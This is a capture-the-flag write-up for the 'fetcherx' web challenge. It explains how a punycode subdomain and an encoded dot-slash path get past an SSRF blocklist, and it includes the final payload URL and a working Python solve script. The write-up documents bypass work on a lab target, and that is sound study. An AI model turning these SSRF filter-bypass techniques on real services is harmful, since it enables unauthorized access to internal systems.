---
title: fetcherx
date: 2026-06-28
tags:
- web
- MntcrlCTF-2026
---

- **Challenge:** fetcherx
- **Category:** Web
- **Flag:** `mntcrl{h77px_is_br0k3n_4s_fuck_c61fbcb98479b509}`

---

## My initial read / first impressions

We are given a web challenge with the description:

```text
heard you like fetching things, try to fetch my secret!
```

So immediately this sounds like an SSRF challenge. There is probably some public fetcher endpoint, some internal secret service, and we need to make the public service fetch the internal flag endpoint for us.

The files were pretty small:

- `fetcher.py`
- `secret.py`
- `Dockerfile`
- `docker-compose.yml`
- `nginx.conf`
- `dnsmasq.conf`
- `supervisord.conf`
- `entrypoint.sh`

The important public app is in `fetcher.py`.

```python
class VisitRequest(BaseModel):
    url: HttpUrl

class VisitResponse(BaseModel):
    status_code: int
    content: str

app = FastAPI()

BLOCKED_DOMAIN = "ѕecret.internal"
BLOCKED_PATH = "getflag"

@app.post("/visit")
async def visit(request: VisitRequest) -> VisitResponse:
    url = str(request.url)
    parsed = httpx.URL(url)

    host = parsed.host.rstrip(".")
    path = parsed.path.strip("/")

    if host.endswith(BLOCKED_DOMAIN):
        logging.warning(f"Attempt to visit blocked domain {host} in URL: {url}")
        return VisitResponse(status_code=403, content="Access to this domain is blocked.")
    
    if path.startswith(BLOCKED_PATH) or path.endswith(BLOCKED_PATH):
        logging.warning(f"Attempt to access blocked path {path} in URL: {url}")
        return VisitResponse(status_code=403, content="Access to this path is blocked.")

    try:
        async with httpx.AsyncClient() as client:
            response = await client.get(url, timeout=5, follow_redirects=False)
            return VisitResponse(status_code=response.status_code, content=response.text)    
    except Exception as e:
        logging.error(f"Request failed for URL: {url}, Error: {str(e)}")
        return VisitResponse(status_code=500, content=f"Request failed: {str(e)}")
```

The app takes a URL from JSON, parses it with `httpx.URL`, blocks one domain and one path, then fetches it.

So yeah, this is SSRF with a very custom blocklist.

## The secret service

The actual flag endpoint is in `secret.py`.

```python
@app.middleware("http")
async def check_fetcher(request: Request, call_next):
    if request.headers.get("X-Proxy") != "nginx":
        return JSONResponse(status_code=403, content={"error": "Did you really think I'm that stupid?"})
    response = await call_next(request)
    return response

@app.get("/getflag")
@app.get("/getflag/")
async def get_flag():
    return {"flag": flag}
```

The flag is at:

```text
/getflag
```

or:

```text
/getflag/
```

But there is a middleware check. The secret service only responds if the request has:

```text
X-Proxy: nginx
```

So we cannot just directly SSRF `http://127.0.0.1:1337/getflag`, because the request from `httpx` will not magically include that header.

That means we need to go through nginx.

The nginx config is the next important part.

```nginx
upstream secret_backend {
    server 127.0.0.1:1337;
}

server {
    listen 80 default_server;
    server_name _;
    return 444;
}

server {
    listen 80;
    server_name .xn--ecret-g2e.internal;

    location / {
        include proxy_params;
        proxy_set_header X-Proxy "nginx";
        proxy_pass http://secret_backend/;
    }
}
```

So nginx listens on port 80 and proxies requests to the secret backend only for this server name:

```text
.xn--ecret-g2e.internal
```

When nginx proxies it, it adds the required header:

```text
X-Proxy: nginx
```

So the real goal is:

1. Make `/visit` fetch nginx.
2. Use the correct host so nginx routes to the secret backend.
3. Make nginx normalize the path into `/getflag/`.
4. Bypass the fetcher's domain and path checks.

## The weird domain thing

The blocklist domain is this:

```python
BLOCKED_DOMAIN = "ѕecret.internal"
```

At a glance it looks like:

```text
secret.internal
```

But it is not normal ASCII `secret`.

The first character is a Unicode lookalike. It is Cyrillic `ѕ`, not normal `s`.

That Unicode domain corresponds to the punycode domain:

```text
xn--ecret-g2e.internal
```

And dnsmasq is configured to resolve that internal domain to localhost.

```text
address=/xn--ecret-g2e.internal/127.0.0.1
```

So the internal nginx host we want is:

```text
xn--ecret-g2e.internal
```

The obvious try would be:

```text
http://xn--ecret-g2e.internal/getflag
```

But that gets blocked.

Why? Because `httpx.URL` decodes the exact punycode domain into the Unicode version, so the host becomes:

```text
ѕecret.internal
```

Then this catches it:

```python
if host.endswith(BLOCKED_DOMAIN):
```

So we need to hit nginx's punycode host, but not have `httpx` decode it into the blocked Unicode hostname.

The bypass is to add a subdomain:

```text
a.xn--ecret-g2e.internal
```

The fetcher's `httpx` parsing leaves this as:

```text
a.xn--ecret-g2e.internal
```

So this check does not catch it:

```python
host.endswith("ѕecret.internal")
```

But nginx still accepts it because the config uses:

```text
server_name .xn--ecret-g2e.internal;
```

That leading dot makes it match both the base domain and subdomains.

So the host bypass is:

```text
a.xn--ecret-g2e.internal
```

## The path block

The second block is the path check.

```python
path = parsed.path.strip("/")

if path.startswith(BLOCKED_PATH) or path.endswith(BLOCKED_PATH):
    return VisitResponse(status_code=403, content="Access to this path is blocked.")
```

`BLOCKED_PATH` is:

```text
getflag
```

So these obvious paths are blocked:

```text
/getflag
/getflag/
```

The important weakness is that this check is just string-based. It checks what `httpx` thinks the path is, but nginx will normalize the path before proxying.

The working path bypass was:

```text
/.%2fgetflag%2f.
```

When the fetcher parses it, the path effectively looks like this:

```text
/./getflag/.
```

After `strip("/")`, that becomes:

```text
./getflag/.
```

That does not start with `getflag`, and it does not end with `getflag`, so the fetcher allows it.

But when nginx receives it, it normalizes the path into:

```text
/getflag/
```

So nginx forwards the request to the secret backend as the real flag endpoint.

That gives us the final internal URL:

```text
http://a.xn--ecret-g2e.internal/.%2fgetflag%2f.
```

## The Vulnerability

The bug is basically a parser mismatch.

The app tries to secure SSRF with manual string checks:

```python
host.endswith(BLOCKED_DOMAIN)
path.startswith(BLOCKED_PATH)
path.endswith(BLOCKED_PATH)
```

But there are multiple parsers involved:

- Pydantic validates the URL.
- `httpx.URL` parses and normalizes parts of the URL.
- dnsmasq resolves the internal punycode domain.
- nginx chooses the virtual host.
- nginx normalizes the path.
- FastAPI receives the final proxied request.

The fetcher blocks based on one interpretation of the URL, but nginx routes based on another interpretation.

That mismatch is the whole solve.

The domain bypass abuses punycode / Unicode behavior:

```text
a.xn--ecret-g2e.internal
```

The path bypass abuses encoded slashes and dot normalization:

```text
/.%2fgetflag%2f.
```

Together, the fetcher thinks the request is safe, but nginx turns it into a valid request to the secret flag endpoint.

## Solution Script

Here is the final solve script.

```python
import json
import re
import sys

import requests


BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "https://fetcherx-faf3da079b8f.c.mntcrl.it"

TARGET = "http://a.xn--ecret-g2e.internal/.%2fgetflag%2f."

r = requests.post(
    f"{BASE}/visit",
    json={"url": TARGET},
    timeout=10,
)

print("[+] status:", r.status_code)
print("[+] raw:", r.text)

r.raise_for_status()
outer = r.json()
content = outer.get("content", "")

print("[+] fetched content:", content)

try:
    inner = json.loads(content)
    if "flag" in inner:
        print("[+] flag:", inner["flag"])
        sys.exit(0)
except json.JSONDecodeError:
    pass

m = re.search(r"mntcrl\{[^}]+\}", content)
if m:
    print("[+] flag:", m.group(0))
else:
    print("[-] flag not found")
```

Running it:

```bash
python solve.py
```

Output:

```text
[+] status: 200
[+] raw: {"status_code":200,"content":"{\"flag\":\"mntcrl{h77px_is_br0k3n_4s_fuck_c61fbcb98479b509}\"}"}
[+] fetched content: {"flag":"mntcrl{h77px_is_br0k3n_4s_fuck_c61fbcb98479b509}"}
[+] flag: mntcrl{h77px_is_br0k3n_4s_fuck_c61fbcb98479b509}
```

And that gives the flag.

## Final payload

The entire challenge comes down to this URL:

```text
http://a.xn--ecret-g2e.internal/.%2fgetflag%2f.
```

The host bypasses the Unicode domain block, but still matches nginx.

The path bypasses the fetcher's `getflag` string check, but still normalizes to `/getflag/`.

So the final flag is:

```text
mntcrl{h77px_is_br0k3n_4s_fuck_c61fbcb98479b509}
```
